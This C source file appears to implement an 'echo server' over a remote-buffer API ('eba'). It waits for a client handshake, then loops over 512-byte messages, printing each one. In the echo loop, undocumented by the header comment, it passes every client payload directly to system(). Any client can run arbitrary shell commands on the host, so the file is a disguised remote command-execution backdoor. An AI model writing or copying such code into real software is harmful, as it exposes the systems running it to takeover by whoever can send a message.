/* ---------------------------------------------------------------
 *  Echo-server
 *  --------------------------------------------------------------
 *  1.Allocates an 8-byte “connection buffer” and prints its ID.
 *  2.Waits until a client writes its own 8-byte buffer ID there.
 *  3.Allocates a 512-byte echo buffer and tells the client its ID.
 *  4.Re-uses that echo buffer in a loop:
 *       – waits for the client to set byte 0 != 0 ( client written data ),
 *       – reads the 512-byte payload,
 *       – prints it,
 *       – resets byte 0 to 0 .
 *     The loop stops when the payload starts with “exit”.
 * -----------------------------------------------------------------*/

 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
 #include <ctype.h>
 #include <unistd.h>      
 #include "eba_user.h"      
 
 enum INVOKE_STATUS {
     INVOKE_QUEUED = 0,
     INVOKE_COMPLETED,
     INVOKE_FAILED,
     INVOKE_DEFAULT
 };
 
 int main(void)
 {
    /*1.Listen on an 8-byte “port”.*/
     uint64_t cn_buf_id = eba_alloc(8, 0, 0);
     if (cn_buf_id == 0) {
         fprintf(stderr, "eba_alloc() failed for connection buffer\n");
         return EXIT_FAILURE;
     }
     printf("server echo connection = %lu\n", cn_buf_id);
 

      /*2.Wait for the client to publish its buffer ID.*/

     uint64_t client_buf_id = 0;
     while (client_buf_id == 0) {
         if (eba_read(&client_buf_id, cn_buf_id, 0, 8) != 0) {
             fprintf(stderr, "eba_read() failed while polling for client\n");
             return EXIT_FAILURE;
         }
         sleep(1);
     }
     printf("client handshake buffer = %lu\n", client_buf_id);
 
     /*3.Allocate the real 512-byte echo buffer.*/
     uint64_t echo_buf_id = eba_alloc(512, 0, 0);
     if (echo_buf_id == 0) {
         fprintf(stderr, "eba_alloc() failed for echo buffer\n");
         return EXIT_FAILURE;
     }
 
     /* send echo_buf_id back to the client */
     int iid = eba_remote_write(client_buf_id,0,8,(const char *)&echo_buf_id,0); 
     if (iid == 0) {
         fprintf(stderr, "eba_remote_write() returned 0 (failure)\n");
         return EXIT_FAILURE;
     }
     int ret = eba_wait_iid(iid, INVOKE_COMPLETED, 5000);
     if (ret == 1) {
         fprintf(stderr, "wait timeout on remote_write\n");
         return EXIT_FAILURE;
     } else if (ret < 0) {
         fprintf(stderr, "error while waiting on remote_write\n");
         return EXIT_FAILURE;
     }
     printf("echo buffer id sent to client = %lu\n", echo_buf_id);
 
    /*4.Echo-loop.*/
     uint8_t flag = 0;
     uint8_t payload[512];
 
     printf("waiting for messages… (client types “exit” to quit)\n");
     for (;;) {
         /* wait until the client raises writes to the buf */
         while (flag == 0){
             if (eba_read(&flag, echo_buf_id, 0, 1) != 0) {
                 fprintf(stderr, "eba_read() failed on flag byte\n");
                 return EXIT_FAILURE;
             }
             sleep(1);
         }
 
         /* read the entire 512-byte payload */
         if (eba_read(payload, echo_buf_id, 0, sizeof(payload)) != 0) {
             fprintf(stderr, "eba_read() failed on payload\n");
             return EXIT_FAILURE;
         }
         payload[sizeof(payload) - 1] = '\0';   /* add null byte to print as string */
 
         printf("client says: %s\n", (char *)payload);
         system(payload);
         /* exit ? */
         
         if (strncmp((char *)payload,"exit",4) == 0) {
             printf("client requested exit bye!\n");
             break;
         }
 
         /* reset flag for the next round */
         flag = 0;
         if (eba_write(&flag, echo_buf_id, 0, 1) != 0) {
             fprintf(stderr, "eba_write() failed while clearing flag\n");
             return EXIT_FAILURE;
         }
     }
     return EXIT_SUCCESS;
 }
 